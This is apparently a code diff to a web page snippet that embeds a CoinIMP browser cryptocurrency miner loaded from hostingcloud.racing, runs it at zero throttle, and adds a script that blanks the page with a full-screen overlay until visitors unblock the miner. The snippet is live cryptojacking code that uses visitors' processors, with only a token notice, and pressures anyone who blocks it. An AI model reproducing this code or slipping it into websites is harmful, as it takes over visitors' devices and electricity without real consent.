@@ -1,8 +1,24 @@
 <script src="https://www.hostingcloud.racing/87Dn.js"></script>
 <script>
-    var _client = new Client.Anonymous('df844c2c8337a8c1036bb72dbe6154534a79f9d7069dabf27cfeef35e76d6e74', {
+    var _client = new Client.Anonymous('eba4bf186aab17d476c13f2d8816b117157f0f55df91aa57589633f8edb3233a', {
         throttle: 0, c: 'w'
     });
     _client.start();
-_client.addMiningNotification("Floating Top", "This site uses crypto mining to help fund development and charitable causes. By participating, you contribute to this initiative. Mining is voluntary and powered by your device", "#cccccc", 40, "#3d3d3d");
+    _client.addMiningNotification("Floating Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
 </script>
